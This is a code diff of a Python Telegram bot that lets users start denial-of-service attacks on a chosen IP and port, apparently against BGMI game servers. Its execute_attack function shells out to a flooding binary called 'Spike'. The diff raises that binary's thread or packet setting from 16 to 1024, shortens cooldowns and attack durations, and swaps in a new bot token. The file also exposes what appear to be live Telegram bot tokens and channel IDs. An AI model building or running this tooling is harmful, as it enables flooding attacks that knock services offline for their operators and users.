@@ -17,7 +17,7 @@ from requests.exceptions import ReadTimeout
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel IDs
-TOKEN = '7788865701:AAFQFi_UzrLETGdJIDmPMBaZuQcOBeLfGdo'  # Replace with your actual bot token
+TOKEN = '7788865701:AAFVnyb9cjuMTj8UtUs_FzAt2clPqKc1liE'  # Replace with your actual bot token
 CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID for attacks
 FEEDBACK_CHANNEL_ID = '-1002272079452'  # Replace with your specific channel ID for feedback
 message_queue = []
@@ -47,12 +47,12 @@ pending_feedback = set()
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Configuration
-COOLDOWN_DURATION = 600  # 1 minute cooldown
+COOLDOWN_DURATION = 60  # 1 minute cooldown
 BAN_DURATION = timedelta(hours=1)  # 1 hour ban for invalid feedback
 DAILY_ATTACK_LIMIT = 5000
 EXEMPTED_USERS = [7163028849, 7184121244]
 # Configuration
-MAX_ATTACK_DURATION = 150  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
+MAX_ATTACK_DURATION = 60  # Maximum attack duration in seconds (e.g., 300 seconds = 5 minutes)
 
 def is_member(user_id):
     """Check if the user is a member of the official channel."""
@@ -214,7 +214,7 @@ def bgmi_command(message):
             bot.reply_to(message, "❌ Daily attack limit reached!")
             return
 
-    # Process attack
+    # Process attackf
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 16 750",
+            f"./Spike {ip} {port} {duration} 1024 750",
             stderr=asyncio.subprocess.PIPE
         )
 
